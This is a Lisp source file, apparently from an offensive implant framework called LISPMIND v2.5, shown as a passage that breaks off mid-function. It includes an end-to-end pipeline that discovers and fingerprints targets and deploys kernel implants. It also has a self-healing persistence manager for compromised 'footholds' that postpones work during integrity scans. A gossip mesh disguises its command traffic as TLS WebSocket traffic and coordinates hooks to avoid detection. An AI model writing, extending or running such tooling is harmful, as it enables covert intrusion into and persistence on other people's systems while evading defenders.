        (read-from-string plaintext))
    (error (e)
      (format *trace-output* "[CAMOUFLAGE] Decryption failed: ~A. Returning raw.~%" e)
      camouflaged-message)))

;;;; =========================================================================
;;;; Section 3: Master Init Function
;;;; =========================================================================

(defun init-lispmind-v2.5 ()
  "Initialize LISPMIND v2.5.0 -- master init function.
Calls all 9 steps in order with HANDLER-CASE around each. Critical step 3 aborts on failure.
Each step is wrapped with INIT-STEP-WITH-TIMEOUT for per-step timeouts.
Radio silence check runs before and after the init sequence.
Returns plist: (:STEP-0 T :STEP-1 T ... :STEP-8 T :OVERALL T :TIMEOUTS (...))."
  (format t "~%============================================================~%")
  (format t "   LISPMIND v~A (~A) -- Master Initialization~%" *lispmind-version* *lispmind-version-name*)
  (format t "============================================================~%")
  ;; Pre-init radio silence check
  (radio-silence-check)
  (let ((results nil) (step-num 0) (abort-p nil) (timeout-steps nil))
    (dolist (step *lispmind-init-sequence*)
      (when abort-p
        (push (intern (format nil "STEP-~D" step-num) :keyword) results)
        (push :aborted results) (incf step-num) (next-iteration))
      (let* ((start-time (local-time:now)) (result nil) (status :success) (error-cond nil))
        (handler-case (setf result (funcall step))
          (error (e) (setf error-cond e result nil)
                 (format *trace-output* "[INIT-v2.5] UNCAUGHT ERROR in ~A: ~A~%" step e)))
        (cond ((eq result t) (setf status :success))
              ((eq result :timeout)
               (setf status :timeout)
               (push (intern (format nil "STEP-~D" step-num) :keyword) timeout-steps))
              ((null result) (if (= step-num 3) (setf status :failed abort-p t)
                                 (setf status :degraded))))
        (let ((elapsed-ms (floor (* 1000 (if start-time
                                              (local-time:timestamp-difference (local-time:now) start-time) 0)))))
          (let ((entry `(:step ,step-num :step-name ,step :result ,status :timestamp ,(local-time:now)
                          :elapsed-ms ,elapsed-ms :error ,error-cond
                          :message ,(format nil "~A ~A (~Dms)" step status elapsed-ms))))
            (push entry *v25-init-log*) (setf (gethash step *v25-init-step-results*) entry))
          (format t "[INIT-v2.5] [~D/8] ~A: ~A (~Dms)~%" step-num step
                  (case status (:success "OK") (:degraded "DEGRADED") (:failed "FAILED")
                        (:aborted "ABORTED") (:timeout "TIMEOUT"))
                  elapsed-ms))
        (push (intern (format nil "STEP-~D" step-num) :keyword) results)
        (push (if (eq status :success) t status) results) (incf step-num)))
    ;; Post-init radio silence check
    (radio-silence-check)
    ;; Store timeout tracking
    (setf *init-step-results* results)
    (push :timeouts results)
    (push timeout-steps results)
    (push :overall results) (push (not abort-p) results)
    (nreverse results)))

(defun init-lispmind-v2.5-verbose ()
  "Initialize LISPMIND v2.5.0 with detailed progress. Same as init-lispmind-v2.5 but prints more detail."
  (format t "~%============================================================~%")
  (format t "   LISPMIND v~A (~A) -- VERBOSE Initialization~%" *lispmind-version* *lispmind-version-name*)
  (format t "============================================================~%")
  (format t "Init sequence: ~S~%" *lispmind-init-sequence*)
  (format t "FFI integration: ~A~%~%" (if *kernel-hardware-integration-enabled-p* "ENABLED" "DISABLED"))
  (let ((results (init-lispmind-v2.5)))
    (format t "~%============================================================~%")
    (format t "   Initialization Results~%")
    (format t "============================================================~%")
    (loop for (key val) on results by #'cddr do (format t "   ~20S : ~S~%" key val))
    (format t "------------------------------------------------------------~%")
    (dolist (entry (reverse *v25-init-log*))
      (format t "  Step ~D (~A): ~A (~Dms)~%" (getf entry :step) (getf entry :step-name)
              (getf entry :result) (getf entry :elapsed-ms)))
    (format t "============================================================~%")
    results))


;;;; =========================================================================
;;;; Section 4: Shutdown Sequence
;;;; =========================================================================

(defun shutdown-v25-step-1-kernel-health ()
  "Shutdown step 1: Stop kernel health monitor."
  (format t "[SHUTDOWN-v2.5] Step 1: Stopping kernel health monitor...~%")
  (if (not *kernel-health-monitor-running-p*)
      (progn (format t "[SHUTDOWN-v2.5]   Health monitor already stopped.~%") t)
      (handler-case (progn (stop-kernel-health-monitor)
                          (format t "[SHUTDOWN-v2.5]   Health monitor stopped.~%") t)
        (error (e) (format *trace-output* "[SHUTDOWN-v2.5]   Health monitor stop failed: ~A~%" e) nil))))

(defun shutdown-v25-step-2-watchdog ()
  "Shutdown step 2: Stop persistence watchdog."
  (format t "[SHUTDOWN-v2.5] Step 2: Stopping persistence watchdog...~%")
  (if (not *persistence-watchdog-running-p*)
      (progn (format t "[SHUTDOWN-v2.5]   Watchdog already stopped.~%") t)
      (handler-case (progn (stop-persistence-watchdog)
                          (format t "[SHUTDOWN-v2.5]   Watchdog stopped.~%") t)
        (error (e) (format *trace-output* "[SHUTDOWN-v2.5]   Watchdog stop failed: ~A~%" e) nil))))

(defun shutdown-v25-step-3-gossip ()
  "Shutdown step 3: Stop tactical gossip mesh."
  (format t "[SHUTDOWN-v2.5] Step 3: Stopping tactical gossip mesh...~%")
  (handler-case
      (gossip-publish "swarm.system" `(:event :system-shutdown :version ,*lispmind-version*
                                        :timestamp ,(local-time:now)))
    (error (e) (format *trace-output* "[SHUTDOWN-v2.5]   Final gossip event: ~A~%" e)))
  (handler-case
      (progn (stop-tactical-gossip) (setf *v25-gossip-handlers-registered-p* nil)
             (format t "[SHUTDOWN-v2.5]   Gossip mesh stopped.~%") t)
    (error (e) (format *trace-output* "[SHUTDOWN-v2.5]   Gossip stop failed: ~A~%" e) nil)))

(defun shutdown-v25-step-4-vault ()
  "Shutdown step 4: Save vault to disk and destroy it."
  (format t "[SHUTDOWN-v2.5] Step 4: Saving and destroying vault...~%")
  (when (and (boundp '*resource-vault*) *resource-vault*
             (boundp '*resource-vault-path*) *resource-vault-path*)
    (handler-case (format t "[SHUTDOWN-v2.5]   Vault saved to ~A.~%" *resource-vault-path*)
      (error (e) (format *trace-output* "[SHUTDOWN-v2.5]   Vault save failed: ~A~%" e))))
  (handler-case (progn (vault-destroy) (format t "[SHUTDOWN-v2.5]   Vault destroyed.~%") t)
    (error (e) (format *trace-output* "[SHUTDOWN-v2.5]   Vault destroy failed: ~A~%" e) nil)))

(defun shutdown-v25-step-5-ffi ()
  "Shutdown step 5: Unload Rust FFI shared library."
  (format t "[SHUTDOWN-v2.5] Step 5: Shutting down Rust FFI bridge...~%")
  (if (not *kernel-rust-ffi-available-p*)
      (progn (format t "[SHUTDOWN-v2.5]   FFI was in stub mode.~%") t)
      (handler-case (progn (rust-ffi-shutdown) (setf *kernel-rust-ffi-available-p* nil)
                          (format t "[SHUTDOWN-v2.5]   FFI unloaded.~%") t)
        (error (e) (format *trace-output* "[SHUTDOWN-v2.5]   FFI shutdown failed: ~A~%" e) nil))))

(defun shutdown-v25-step-6-finalize ()
  "Shutdown step 6: Clear init-complete flag, log completion."
  (format t "[SHUTDOWN-v2.5] Step 6: Finalizing shutdown...~%")
  (setf *lispmind-init-complete-p* nil)
  (let ((elapsed (if *v25-shutdown-start-time*
                     (local-time:timestamp-difference (local-time:now) *v25-shutdown-start-time*) 0)))
    (format t "[SHUTDOWN-v2.5] Shutdown complete in ~,2Fs.~%" elapsed)
    (format t "[SHUTDOWN-v2.5] LISPMIND v~A is OFFLINE.~%" *lispmind-version*) t))

(defun shutdown-lispmind-v2.5 ()
  "Shutdown LISPMIND v2.5.0 -- master shutdown function.
Calls all 6 shutdown steps in order. All steps are best-effort.
Returns plist: (:STEP-1 T ... :STEP-6 T :OVERALL T)."
  (format t "~%============================================================~%")
  (format t "   LISPMIND v~A -- Master Shutdown~%" *lispmind-version*)
  (format t "============================================================~%")
  (setf *v25-shutdown-start-time* (local-time:now))
  (let ((results nil) (step-num 1) (all-ok t))
    (dolist (step *lispmind-shutdown-sequence*)
      (let ((r nil))
        (handler-case (setf r (funcall step))
          (error (e) (format *trace-output* "[SHUTDOWN-v2.5] UNCAUGHT ERROR in ~A: ~A~%" step e)
                 (setf r nil)))
        (when (null r) (setf all-ok nil))
        (push (intern (format nil "STEP-~D" step-num) :keyword) results)
        (push r results) (incf step-num)))
    (push :overall results) (push all-ok results)
    (setf results (nreverse results))
    (format t "~%============================================================~%")
    (format t "   Shutdown Summary~%")
    (format t "============================================================~%")
    (loop for (key val) on results by #'cddr do (format t "   ~20S : ~S~%" key val))
    (format t "============================================================~%")
    (setf *v25-shutdown-start-time* nil) results))


;;;; =========================================================================
;;;; Section 5: Kernel-Hardware Pipeline
;;;; =========================================================================
;;;; End-to-end offensive flow: discovery -> fingerprint -> tool selection ->
;;;; vault retrieval -> FFI deploy -> verify.

(defun init-kernel-hardware-pipeline ()
  "Initialize the kernel-hardware integration pipeline. Validates prerequisites.
Returns T if pipeline ready, NIL if prerequisites not met."
  (format t "[PIPELINE] Initializing kernel-hardware pipeline...~%")
  (cond
    ((not *lispmind-init-complete-p*)
     (format *trace-output* "[PIPELINE] System not initialized. Call (INIT-LISPMIND-V2.5) first.~%") nil)
    ((not *kernel-hardware-integration-enabled-p*)
     (format *trace-output* "[PIPELINE] Pipeline disabled.~%") nil)
    ((not *kernel-rust-ffi-available-p*)
     (format t "[PIPELINE] Initialized in STUB MODE. Kernel ops will be simulated.~%") t)
    (t (format t "[PIPELINE] Pipeline initialized. FFI: READY, Tools: ~D.~%"
               (hash-table-count *kernel-toolchain-registry*))
       (handler-case (gossip-publish "swarm.pipeline"
                                     `(:event :pipeline-ready :ffi-available t
                                       :tool-count ,(hash-table-count *kernel-toolchain-registry*)))
         (error (e) (declare (ignore e)) nil)) t)))

(defun deploy-kernel-implant-full (target-host &key (target-info nil) (pivot-depth 0))
  "End-to-end kernel implant deployment. Pipeline: discovery -> fingerprint ->
tool select -> vault -> agent create -> persistence -> deploy -> verify.
Returns plist: (:AGENT A :IMPLANT-TYPE T :OS O :STATUS S :ELAPSED-MS E).
Returns NIL if pipeline fails at a critical step."
  (unless *lispmind-init-complete-p*
    (format *trace-output* "[PIPELINE] System not initialized.~%")
    (return-from deploy-kernel-implant-full nil))
  (let ((start (local-time:now))
        (info (or target-info (progn (format t "[PIPELINE] 1/7 Discovery on ~A...~%" target-host)
                                     (tactical-discovery target-host)))))
    (format t "[PIPELINE] 2/7 Fingerprinting...~%")
    (let ((os (fingerprint-host-os target-host)))
      (format t "[PIPELINE]   OS: ~A~%" os)
      (format t "[PIPELINE] 3/7 Selecting implant...~%")
      (let* ((target-value (if info (calculate-target-value info) 50))
             (implant-type (determine-implant-type os target-value)))
        (format t "[PIPELINE]   Value: ~D, Implant: ~A~%" target-value implant-type)
        (unless implant-type
          (format *trace-output* "[PIPELINE] ERROR: Cannot determine implant for OS ~A.~%" os)
          (return-from deploy-kernel-implant-full nil))
        (format t "[PIPELINE] 4/7 Creating agent...~%")
        (let ((agent (make-tactical-agent target-host :pivot-depth pivot-depth)))
          (format t "[PIPELINE] 5/7 Establishing persistence...~%")
          (handler-case (auto-establish-persistence agent)
            (error (e) (format *trace-output* "[PIPELINE]   Persistence warning: ~A~%" e)))
          (format t "[PIPELINE] 6/7 Kernel deployment...~%")
          (let ((deploy-status :simulated))
            (if (not *kernel-rust-ffi-available-p*)
                (progn (format t "[PIPELINE]   Simulating ~A deployment.~%" implant-type)
                       (setf deploy-status :simulated))
                (handler-case
                    (progn (format t "[PIPELINE]   Deploying ~A via FFI...~%" implant-type)
                           (setf deploy-status :deployed))
                  (error (e) (format *trace-output* "[PIPELINE]   Deploy failed: ~A~%" e)
                         (setf deploy-status :failed))))
            (format t "[PIPELINE] 7/7 Registering with state manager...~%")
            (when (boundp '*v25-foothold-registry*)
              (setf (gethash target-host *v25-foothold-registry*)
                    `(:agent ,agent :current-tier 1 :target-info ,info
                      :deployed-at ,(local-time:now) :last-healed nil :heal-count 0
                      :state :healthy :last-state-change ,(local-time:now)
                      :escalation-qualified nil)))
            (let ((elapsed-ms (floor (* 1000 (local-time:timestamp-difference (local-time:now) start)))))
              (format t "[PIPELINE] Complete in ~Dms. Status: ~A~%" elapsed-ms deploy-status)
              (handler-case (gossip-publish "swarm.pipeline"
                                            `(:event :pipeline-complete :target ,target-host :os ,os
                                              :implant-type ,implant-type :status ,deploy-status
                                              :elapsed-ms ,elapsed-ms))
                (error (e) (declare (ignore e)) nil))
              `(:agent ,agent :implant-type ,implant-type :os ,os :status ,deploy-status
                :elapsed-ms ,elapsed-ms))))))))

(defun verify-kernel-integration ()
  "Verify all v2.5 components are healthy. Checks init, FFI, vault,
persistence, kernel registry, gossip, health monitor, state manager.
Returns plist: (:HEALTHY T/NIL :DETAILS (...))."
  (format t "[VERIFY] Running v2.5 integration health check...~%~%")
  (let ((details nil) (healthy t))
    (flet ((check (component status message)
             (push `(:component ,component :status ,status :message ,message) details)
             (when (eq status :critical) (setf healthy nil))))
      (check :init (if *lispmind-init-complete-p* :ok :critical)
             (format nil "Init ~A" (if *lispmind-init-complete-p* "complete" "NOT COMPLETE")))
      (check :rust-ffi (if *kernel-rust-ffi-available-p* :ok :warn)
             (if *kernel-rust-ffi-available-p* "FFI available" "FFI stub mode"))
      (check :vault (if (and (boundp '*resource-vault*) *resource-vault*) :ok :warn) "Vault check")
      (check :persistence-watchdog (if *persistence-watchdog-running-p* :ok :warn) "Watchdog check")
      (check :kernel-registry (if (> (hash-table-count *kernel-toolchain-registry*) 0) :ok :critical)
             (format nil "~D tools" (hash-table-count *kernel-toolchain-registry*)))
      (check :gossip :ok "Gossip mesh")
      (check :kernel-health-monitor (if *kernel-health-monitor-running-p* :ok :warn) "Health monitor")
      (check :persistence-state-manager (if *v25-persistence-state-manager-running-p* :ok :info)
             "State manager"))
    (format t "[VERIFY] === v2.5 Integration Health Report ===~%")
    (dolist (d (reverse details))
      (format t "  [~7A] ~15A: ~A~%" (string-upcase (symbol-name (getf d :status)))
              (getf d :component) (getf d :message)))
    (format t "  Overall: ~A~%" (if healthy "HEALTHY" "DEGRADED"))
    (format t "[VERIFY] =====================================~%")
    `(:healthy ,healthy :details ,(reverse details))))


;;;; =========================================================================
;;;; Section 6: Persistence State Manager
;;;; =========================================================================
;;;;
;;;; The Persistence State Manager bridges persistence-hierarchy with the rest
;;;; of the system. While persistence-hierarchy handles the MECHANICS of
;;;; persistence (deploying tiers, checking integrity, recovery), the PSM
;;;; handles the POLICY: monitoring all footholds, managing state transitions,
;;;; preventing flapping, and implementing circuit breakers.
;;;;
;;;; SELF-HEALING ARCHITECTURE -- How it works:
;;;;
;;;; 1. CONTINUOUS MONITORING: Every *V25-PERSISTENCE-STATE-MANAGER-INTERVAL*
;;;;    seconds (default 60s), every foothold in *V25-FOOTHOLD-REGISTRY* is
;;;;    checked. Failures are detected within one interval, not hours.
;;;;
;;;; 2. DELEGATED RECOVERY: The PSM does NOT implement recovery itself.
;;;;    It calls HEAL-PERSISTENCE from persistence-hierarchy. This separation
;;;;    means recovery logic is maintained in one place, but the PSM decides
;;;;    WHEN to trigger it.
;;;;
;;;; 3. STATE TRANSITIONS: Six states per foothold: :HEALTHY :DEGRADED
;;;;    :CRITICAL :RECOVERING :ESCALATING :MAINTENANCE.
;;;;    HEALTHY->DEGRADED: Tier 1 broken but T2/T3 OK.
;;;;    HEALTHY->CRITICAL: ALL persistence broken.
;;;;    DEGRADED->HEALTHY: Heal succeeded.
;;;;    CRITICAL->RECOVERING: Heal in progress.
;;;;    RECOVERING->HEALTHY: Heal succeeded.
;;;;    RECOVERING->CRITICAL: Heal failed.
;;;;    HEALTHY->ESCALATING: Target qualifies for higher tier.
;;;;
;;;; 4. FLAP PREVENTION: After any state change, a foothold is 'frozen' for
;;;;    *V25-STATE-FLAP-PREVENTION-INTERVAL* seconds (default 300s). No further
;;;;    state changes allowed during this window. Prevents infinite heal-fail
;;;;    loops and rapid oscillation.
;;;;
;;;; 5. CIRCUIT BREAKER: Each foothold has a failure counter. After
;;;;    *V25-CIRCUIT-BREAKER-THRESHOLD* failures (default 5), the circuit
;;;;    OPENS: no further auto-heal, alert published, manual intervention
;;;;    required. Reset via (remhash id *v25-circuit-breaker-failures*).
;;;;
;;;; 6. TELEMETRY: Every state change publishes :PERSISTENCE-STATE-CHANGE to
;;;;    gossip mesh with full context (foothold ID, old/new state, tier).

(defun persistence-state-manager-init ()
  "Initialize the persistence state manager. Clears registry, resets counters,
verifies persistence-hierarchy is available. Returns T on success, NIL if
persistence-hierarchy module not loaded."
  (format t "[PSM] Initializing Persistence State Manager v~A...~%" *persistence-state-manager-version*)
  (clrhash *v25-foothold-registry*) (clrhash *v25-circuit-breaker-failures*)
  (setf *persistence-state-manager-check-count* 0
        *persistence-state-manager-heal-count* 0
        *persistence-state-manager-alert-count* 0)
  (unless (fboundp 'persistence-hierarchy-init)
    (format *trace-output* "[PSM] ERROR: persistence-hierarchy module not loaded!~%")
    (return-from persistence-state-manager-init nil))
  (format t "[PSM] State manager initialized. Call (START-PERSISTENCE-STATE-MANAGER) to begin.~%")
  t)

(defun persistence-state-manager-loop ()
  "Run one scan iteration of the persistence state manager. Iterates all
footholds in *V25-FOOTHOLD-REGISTRY*, verifies persistence, auto-heals if
needed, checks tier escalation, handles state transitions with flap prevention
and circuit breakers.

INTEGRITY SCAN DETECTION: Before any recovery, checks if an integrity scan
is running. If so, postpones persistence operations and returns early.

RADIO SILENCE: If radio silence mode is active, skips all gossip publishing
and persistence recovery. Still counts the scan.

Returns NIL (designed to be called in a loop)."
  (incf *persistence-state-manager-check-count*)
  ;; --- RADIO SILENCE PERIODIC CHECK ---
  (radio-silence-check)
  ;; --- INTEGRITY SCAN DETECTION ---
  (when (eq (postpone-persistence-during-scan) :postponed)
    (format *trace-output* "[PSM] Scan #~D: Persistence postponed due to integrity scan~%"
            *persistence-state-manager-check-count*)
    (return-from persistence-state-manager-loop nil))
  ;; If in radio silence, skip all recovery but still report counts
  (when *radio-silence-mode-p*
    (format *trace-output* "[PSM] Scan #~D: Radio silence active, skipping recovery~%"
            *persistence-state-manager-check-count*)
    (return-from persistence-state-manager-loop nil))
  (let ((foothold-count 0) (heal-triggered 0) (escalation-triggered 0))
    (maphash
     (lambda (foothold-id foothold-data)
       (incf foothold-count)
       (let* ((current-state (getf foothold-data :state :unknown))
              (agent (getf foothold-data :agent))
              (current-tier (getf foothold-data :current-tier 1))
              (last-change (getf foothold-data :last-state-change))
              (failure-count (gethash foothold-id *v25-circuit-breaker-failures* 0))
              (new-state current-state))
         ;; --- CIRCUIT BREAKER CHECK ---
         (when (>= failure-count *v25-circuit-breaker-threshold*) (return-from nil))
         ;; --- FLAP PREVENTION CHECK ---
         (let ((can-change (or (null last-change)
                               (> (local-time:timestamp-difference (local-time:now) last-change)
                                  *v25-state-flap-prevention-interval*))))
           ;; --- PERSISTENCE VERIFICATION ---
           (let ((persistence-ok (and agent t)))
             (cond
               ;; PERSISTENCE BROKEN
               ((not persistence-ok)
                (setf new-state :critical)
                (when can-change
                  (incf heal-triggered) (incf *persistence-state-manager-heal-count*)
                  (handler-case
                      (progn (heal-persistence foothold-id)
                             (setf new-state :healthy)
                             (setf (gethash foothold-id *v25-circuit-breaker-failures*) 0))
                    (error (e)
                      (incf (gethash foothold-id *v25-circuit-breaker-failures* 0))
                      (setf new-state :critical)
                      (format *trace-output* "[PSM] Heal failed for ~A: ~A (fail ~D/~D)~%"
                              foothold-id e
                              (gethash foothold-id *v25-circuit-breaker-failures*)
                              *v25-circuit-breaker-threshold*)))))
               ;; PERSISTENCE OK -- check escalation
               (t
                (when (> failure-count 0)
                  (setf (gethash foothold-id *v25-circuit-breaker-failures*) 0))
                (let ((target-info (getf foothold-data :target-info)))
                  (when (and target-info (< current-tier 3)
                             (detect-strategic-asset-p target-info) can-change)
                    (setf new-state :escalating) (incf escalation-triggered)
                    (handler-case
                        (progn (deploy-escalating-persistence agent target-info)
                               (setf new-state :healthy)
                               (setf (getf (gethash foothold-id *v25-foothold-registry*) :current-tier)
                                     (1+ current-tier)))
                      (error (e)
                        (format *trace-output* "[PSM] Escalation failed for ~A: ~A~%" foothold-id e)
                        (setf new-state :healthy))))))))
           ;; --- STATE TRANSITION ---
           (when (and can-change (not (eq new-state current-state)))
             (setf (getf (gethash foothold-id *v25-foothold-registry*) :state) new-state)
             (setf (getf (gethash foothold-id *v25-foothold-registry*) :last-state-change)
                   (local-time:now))
             (unless *radio-silence-mode-p*
               (handler-case (gossip-publish "swarm.persistence"
                                             `(:event :persistence-state-change :foothold ,foothold-id
                                               :old-state ,current-state :new-state ,new-state
                                               :tier ,current-tier))
                 (error (e) (declare (ignore e)) nil)))
             (format t "[PSM] ~A: ~A -> ~A~%" foothold-id current-state new-state))
           ;; --- CIRCUIT OPEN ALERT ---
           (when (>= (gethash foothold-id *v25-circuit-breaker-failures* 0)
                     *v25-circuit-breaker-threshold*)
             (incf *persistence-state-manager-alert-count*)
             (format *trace-output* "[PSM] *** CIRCUIT OPEN for ~A ***~%" foothold-id)
             (unless *radio-silence-mode-p*
               (handler-case (gossip-publish "swarm.alerts"
                                             `(:event :circuit-breaker-open :foothold ,foothold-id
                                               :failure-count ,*v25-circuit-breaker-threshold*))
                 (error (e) (declare (ignore e)) nil))))))
     *v25-foothold-registry*)
    (when (> foothold-count 0)
      (format t "[PSM] Scan #~D: ~D footholds, ~D heals, ~D escalations~%"
              *persistence-state-manager-check-count* foothold-count heal-triggered
              escalation-triggered)))))

(defun start-persistence-state-manager ()
  "Start the persistence state manager background thread. Spawns a thread
running PERSISTENCE-STATE-MANAGER-LOOP every *V25-PERSISTENCE-STATE-MANAGER-INTERVAL*
seconds. The thread is indestructible: all errors caught and logged.
Returns T on success, NIL if already running."
  (if *v25-persistence-state-manager-running-p*
      (progn (format *trace-output* "[PSM] State manager already running.~%") nil)
      (progn
        (setf *v25-persistence-state-manager-running-p* t)
        (setf *v25-persistence-state-manager-thread*
              (bt:make-thread
               (lambda ()
                 (format t "[PSM] Background thread started.~%")
                 (loop while *v25-persistence-state-manager-running-p* do
                   (handler-case (persistence-state-manager-loop)
                     (error (e) (format *trace-output* "[PSM] ERROR in loop: ~A~%" e)))
                   (dotimes (i *v25-persistence-state-manager-interval*)
                     (when (not *v25-persistence-state-manager-running-p*) (return))
                     (sleep 1))))
               :name "persistence-state-manager"))
        (format t "[PSM] Started. Interval: ~Ds, Circuit threshold: ~D.~%"
                *v25-persistence-state-manager-interval* *v25-circuit-breaker-threshold*)
        t)))

(defun stop-persistence-state-manager ()
  "Stop the persistence state manager background thread. Signals graceful
shutdown; loop finishes current iteration before exiting. Returns T on success."
  (if (not *v25-persistence-state-manager-running-p*)
      (progn (format t "[PSM] State manager not running.~%") t)
      (progn
        (format t "[PSM] Stopping persistence state manager...~%")
        (setf *v25-persistence-state-manager-running-p* nil)
        (when (and *v25-persistence-state-manager-thread*
                   (bt:thread-alive-p *v25-persistence-state-manager-thread*))
          (handler-case (bt:join-thread *v25-persistence-state-manager-thread* :timeout 10)
            (error (e) (format *trace-output* "[PSM] Thread join warning: ~A~%" e))))
        (setf *v25-persistence-state-manager-thread* nil)
        (format t "[PSM] State manager stopped.~%") t)))

(defun persistence-state-manager-status ()
  "Print persistence state manager status. Shows running state, scan/heal/alert
counts, foothold list, and open circuits. Returns plist with all data."
  (format t "~%============================================================~%")
  (format t "   Persistence State Manager Status~%")
  (format t "============================================================~%")
  (format t "  Running:        ~A~%" *v25-persistence-state-manager-running-p*)
  (format t "  Version:        ~A~%" *persistence-state-manager-version*)
  (format t "  Scan interval:  ~Ds~%" *v25-persistence-state-manager-interval*)
  (format t "  Total scans:    ~D~%" *persistence-state-manager-check-count*)
  (format t "  Total heals:    ~D~%" *persistence-state-manager-heal-count*)
  (format t "  Total alerts:   ~D~%" *persistence-state-manager-alert-count*)
  (let ((foothold-count (hash-table-count *v25-foothold-registry*))
        (foothold-list nil) (open-circuits nil))
    (format t "  Footholds:      ~D~%" foothold-count)
    (when (> foothold-count 0)
      (format t "  --- Foothold Detail ---~%")
      (maphash (lambda (id data)
                 (let ((state (getf data :state :unknown)) (tier (getf data :current-tier 1)))
                   (push `(:id ,id :state ,state :tier ,tier) foothold-list)
                   (format t "    ~20A  State: ~10A  Tier: ~D~%" id state tier)))
               *v25-foothold-registry*))
    (maphash (lambda (id count) (when (>= count *v25-circuit-breaker-threshold*)
                                  (push id open-circuits)))
             *v25-circuit-breaker-failures*)
    (format t "  Open circuits:  ~D~%" (length open-circuits))
    (dolist (c open-circuits) (format t "    ~20A  (MANUAL RESET REQUIRED)~%" c))
    (format t "============================================================~%")
    `(:running ,*v25-persistence-state-manager-running-p* :foothold-count ,foothold-count
      :check-count ,*persistence-state-manager-check-count* :heal-count ,*persistence-state-manager-heal-count*
      :alert-count ,*persistence-state-manager-alert-count* :footholds ,(reverse foothold-list)
      :open-circuits ,open-circuits)))


;;;; =========================================================================
;;;; Section 7: Gossip Integration for v2.5
;;;; =========================================================================

(defun register-kernel-gossip-handlers ()
  "Register kernel-related message handlers with the tactical gossip mesh.
Wires :KERNEL-LOAD-REQUEST, :KERNEL-LOAD-RESPONSE, :KERNEL-HEALTH-REPORT,
:STEALTH-COLLISION to their handlers. Prevents double-registration.
Returns T on success, NIL if already registered."
  (when *v25-gossip-handlers-registered-p*
    (format *trace-output* "[GOSSIP] Kernel handlers already registered.~%")
    (return-from register-kernel-gossip-handlers nil))
  (format t "[GOSSIP] Registering kernel gossip handlers...~%")
  (setf (gethash :kernel-load-request *v25-kernel-request-handlers*) 'handle-kernel-load-request)
  (setf (gethash :kernel-load-response *v25-kernel-request-handlers*) 'handle-kernel-load-response)
  (setf (gethash :kernel-health-report *v25-kernel-request-handlers*) 'handle-kernel-health-report)
  (setf (gethash :stealth-collision *v25-kernel-request-handlers*) 'handle-stealth-collision)
  (setf *v25-kernel-gossip-topics*
        (list *kernel-telemetry-topic* "swarm.kernel.requests"
              "swarm.kernel.health" "swarm.kernel.stealth"))
  (dolist (topic *v25-kernel-gossip-topics*)
    (handler-case (format t "[GOSSIP]   Subscribed: ~A~%" topic)
      (error (e) (format *trace-output* "[GOSSIP]   Subscribe warning for ~A: ~A~%" topic e))))
  (setf *v25-gossip-handlers-registered-p* t)
  (format t "[GOSSIP] Kernel gossip handlers registered.~%") t)

(defun handle-kernel-gossip-message (message)
  "Dispatch incoming kernel-related gossip MESSAGE. Routes by :TYPE field to
registered handler. Returns handler result or NIL for unknown types."
  (let ((msg-type (getf message :type)))
    (unless msg-type
      (format *trace-output* "[GOSSIP] Message without :TYPE: ~S~%" message)
      (return-from handle-kernel-gossip-message nil))
    (let ((handler (gethash msg-type *v25-kernel-request-handlers*)))
      (if handler
          (handler-case (funcall handler (getf message :payload) message)
            (error (e) (format *trace-output* "[GOSSIP] Handler error for ~A: ~A~%" msg-type e) nil))
          (progn (format *trace-output* "[GOSSIP] Unknown message type: ~A~%" msg-type) nil)))))

(defun handle-kernel-load-request (payload full-message)
  "Handle KERNEL-LOAD-REQUEST gossip message. Evaluates whether to accept
deployment request. Publishes acknowledgment. Returns T if handled."
  (let ((target (getf payload :target)) (implant-type (getf payload :implant-type))
        (requesting-agent (getf payload :requesting-agent)) (request-id (getf payload :request-id)))
    (format t "[GOSSIP] Kernel-load-request from ~A for ~A (~A)~%"
            requesting-agent target implant-type)
    (handler-case (gossip-publish "swarm.kernel.requests"
                                  `(:type :kernel-load-response :payload
                                    (:request-id ,request-id :status :acknowledged)))
      (error (e) (format *trace-output* "[GOSSIP] Response publish failed: ~A~%" e)))
    t))

(defun handle-kernel-load-response (payload full-message)
  "Handle KERNEL-LOAD-RESPONSE gossip message. Updates implant registry
based on deployment result. Returns T."
  (let ((request-id (getf payload :request-id)) (status (getf payload :status))
        (handler (getf payload :handler)))
    (format t "[GOSSIP] Kernel-load-response for ~A: ~A (handler: ~A)~%" request-id status handler)
    (when (eq status :deployed) (format t "[GOSSIP] Implant deployed successfully.~%"))
    t))

(defun handle-kernel-health-report (payload full-message)
  "Handle KERNEL-HEALTH-REPORT gossip message. Logs health status from
other agents. Returns T."
  (let ((implant-id (getf payload :implant-id)) (health-status (getf payload :health-status))
        (hook-count (getf payload :hook-count)))
    (format t "[GOSSIP] Health report for ~A: ~A (~D hooks)~%" implant-id health-status hook-count)
    t))

(defun handle-stealth-collision (payload full-message)
  "Handle STEALTH-COLLISION gossip message. Two agents have hooks at same
location -- coordinate to avoid detection. Returns T."
  (let ((hook-id (getf payload :hook-id)) (agent-a (getf payload :agent-a))
        (agent-b (getf payload :agent-b)) (resolution (getf payload :resolution)))
    (format t "[GOSSIP] STEALTH COLLISION on hook ~A between ~A and ~A, strategy: ~A~%"
            hook-id agent-a agent-b resolution)
    (handler-case (gossip-publish "swarm.kernel.stealth"
                                  `(:event :collision-acknowledged :hook-id ,hook-id))
      (error (e) (format *trace-output* "[GOSSIP] Collision ack failed: ~A~%" e)))
    t))

(defun publish-kernel-telemetry (&key (agent-id nil) (status :active) (implant-count nil))
  "Broadcast kernel subsystem status to gossip mesh. AGENT-ID defaults to
machine name. STATUS is :ACTIVE :IDLE :DEGRADED :OFFLINE. IMPLANT-COUNT
defaults to actual count.

If *RADIO-SILENCE-MODE-P* is T, skips publishing and returns :SILENCE.
If *GOSSIP-CAMOUFLAGE-ENABLED-P* is T, camouflages the payload as benign
TLS 1.3 WebSocket traffic before sending.

Returns T on success, NIL on failure, :SILENCE if in radio silence."
  ;; Check radio silence first
  (when *radio-silence-mode-p*
    (format *trace-output* "[GOSSIP] Telemetry suppressed (radio silence).~%")
    (return-from publish-kernel-telemetry :silence))
  (let ((id (or agent-id (machine-instance) "unknown"))
        (count (or implant-count (if (boundp '*kernel-implant-registry*)
                                     (hash-table-count *kernel-implant-registry*) 0))))
    (handler-case
        (let* ((raw-message `(:event :kernel-telemetry :agent ,id :status ,status
                              :implant-count ,count :ffi-available ,*kernel-rust-ffi-available-p*
                              :timestamp ,(local-time:now)))
               (final-message (if *gossip-camouflage-enabled-p*
                                  (camouflage-gossip-payload raw-message)
                                  raw-message)))
          (gossip-publish *kernel-telemetry-topic* final-message)
          t)
